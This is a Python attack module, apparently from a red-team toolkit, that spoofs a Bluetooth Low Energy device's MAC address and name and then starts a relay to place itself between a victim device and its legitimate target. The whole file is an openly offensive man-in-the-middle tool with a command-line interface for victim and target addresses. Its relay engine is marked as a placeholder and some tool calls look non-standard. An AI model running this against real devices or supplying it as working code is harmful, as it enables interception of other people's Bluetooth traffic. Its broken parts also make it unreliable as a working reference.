# modules/attacks/ble_man_in_the_middle.py

import subprocess
import argparse
import time
import os
import json
from datetime import datetime

LOG_PATH = "results/ble_mitm_logs.json"
MITRE_TTP = "T1557.002"  # Adversary-in-the-Middle: Bluetooth

def log_event(entry):
    os.makedirs("results", exist_ok=True)
    if os.path.exists(LOG_PATH):
        with open(LOG_PATH, "r") as f:
            data = json.load(f)
    else:
        data = []
    data.append(entry)
    with open(LOG_PATH, "w") as f:
        json.dump(data, f, indent=2)

def start_advertising(interface, name, mac):
    print(f"[+] Spoofing BLE advertising on {interface} as {mac} ({name})")
    subprocess.call(["sudo", "hciconfig", interface, "down"])
    subprocess.call(["sudo", "bdaddr", "-i", interface, mac])
    subprocess.call(["sudo", "hciconfig", interface, "up"])
    subprocess.call(["sudo", "hcitool", "-i", interface, "name", name])
    subprocess.call(["sudo", "hcitool", "-i", interface, "advertise"])

def start_proxy(interface_victim, interface_target):
    print(f"[+] Starting MITM relay between victim ({interface_victim}) and target ({interface_target})")
    # Use btproxy or ble_relay (placeholder for real BLE proxy engine)
    subprocess.Popen([
        "btproxy", "--victim-if", interface_victim,
        "--target-if", interface_target
    ])
    print("[*] Proxy engine started")

def mitm_attack(victim_mac, target_mac, iface_victim, iface_target, spoof_name):
    print("[*] Performing BLE MITM attack...")

    # Step 1: Spoof target advertising
    start_advertising(iface_victim, spoof_name, target_mac)
    time.sleep(3)

    # Step 2: Start proxy relay
    start_proxy(iface_victim, iface_target)

    # Step 3: Log
    log_event({
        "timestamp": datetime.utcnow().isoformat(),
        "victim_mac": victim_mac,
        "target_mac": target_mac,
        "iface_victim": iface_victim,
        "iface_target": iface_target,
        "spoof_name": spoof_name,
        "ttp": MITRE_TTP
    })

    print("[✓] BLE MITM launched")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="BLE MITM Spoofer & Proxy Relay")
    parser.add_argument("--victim-mac", required=True, help="BLE MAC of victim device")
    parser.add_argument("--target-mac", required=True, help="BLE MAC of target legitimate device")
    parser.add_argument("--iface-victim", default="hci0", help="Interface to spoof victim connections (default: hci0)")
    parser.add_argument("--iface-target", default="hci1", help="Interface to connect to real target (default: hci1)")
    parser.add_argument("--spoof-name", default="BLE_Target", help="Device name to advertise (default: BLE_Target)")

    args = parser.parse_args()

    mitm_attack(args.victim_mac, args.target_mac, args.iface_victim, args.iface_target, args.spoof_name)
